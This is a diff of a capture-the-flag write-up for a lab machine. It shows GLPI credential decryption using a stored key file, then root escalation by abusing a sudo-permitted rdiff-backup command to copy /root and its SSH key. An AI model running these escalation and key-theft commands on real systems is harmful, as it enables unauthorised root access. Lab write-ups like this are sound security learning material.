@@ -284,13 +284,6 @@ define("GLPIKEY", "GLPI£i'snarss'ç")
 
 There we see that there are two methods, decrypt() and decryptUsingLegacyKey(). Inside this methods ' libsodium XChaCha20-Poly1305' is mentioned, which is an ecrypting method.
 
-- At line 103 we see another interesting file `$this->keyfile = $config_dir . '/glpicrypt.key';`. Using `find` the absolute path is `/opt/glpi/config/glpicrypt.key`
-
-```bash
-wc -c /opt/glpi/config/glpicrypt.key
-```
-
-- The file is as big as the define length on the previous .php functions, therefore it should be the key. Lets make a scritp for decryption:
 
 1. Create tmp directory
 ```bash
@@ -299,7 +292,7 @@ cd "$(mktemp -d)"
 
 2. Make the script
 
-```bash
+```php
 #decrypt.php                                               
 <?php
 define("GLPI_CONFIG_DIR", "/opt/glpi/config");
@@ -329,17 +322,72 @@ openam@management:/tmp/tmp.WghDYlDbtT$ php key_get.php
 
 ```
 
+- The user flag is on owen's directory
 
-----On going------
+**User** fñag acquired!!
+
+## Privilege Escalation (Root Flag)
+
+- Doing basic PE enumeration:
+
+```
+owen@management:~$ sudo -l
+
+Matching Defaults entries for owen on management:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User owen may run the following commands on management:
+    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
+```
+
+There is a binary with sudo perms.
+
+- Explanation
+
+`rdiff-backup`is a tool made for incremental backups. Some flags allow to make a server so that you can execute the operations btween machines.
+
+This flags may help an attacker to execute commands on directories they shouldn't be able to. 
+
+- Command:
+
+```
+rdiff-backup --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' backup /::/root /tmp/root_bakup
+```
+
+- With this we can see the root flag on /tmp/
 
 
+```bash
+owen@management:/opt/backup/assets$ rdiff-backup --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' backup /::/root /tmp/root_bakup
+WARNING: this command line interface is deprecated and will disappear, start using the new one as described with '--new --help'.
+WARNING: Server will be called with deprecated command line interface to guarantee compatibility. It might lead to a deprecation warning from newer rdiff-backup versions. Use '--api-version 201' (or higher) to avoid it.
+NOTE: Starting mirror from source path /root to destination path /tmp/root_bakup
+owen@management:/opt/backup/assets$ cd /tmp/root_bakup
+owen@management:/tmp/root_bakup$ ls
+rdiff-backup-data  root.txt
+owen@management:/tmp/root_bakup$ cat root.txt
+```
 
+But the real objective is to acquire root.
 
+- Find ssh key and connect to root:
+
+```bash
+ssh root@localhost -i id_ed25519
+```
+
+**Root** acquired!!
 
 --- 
 
 # Learned
 
-Don't skip something on linpeas only because its not 'orange'(95% of being a vector for PE). 
+1. Don't skip something on linpeas only because its not 'orange'(95% of being a vector for PE). 
 
 In this case there were credentials on a file that wasn't marked as orange, because linpeas doesn't take lateral movement as PE.
+
+2. Creds may not always be on 'users' table
+
+3. Cryptography methods
+
+--- 
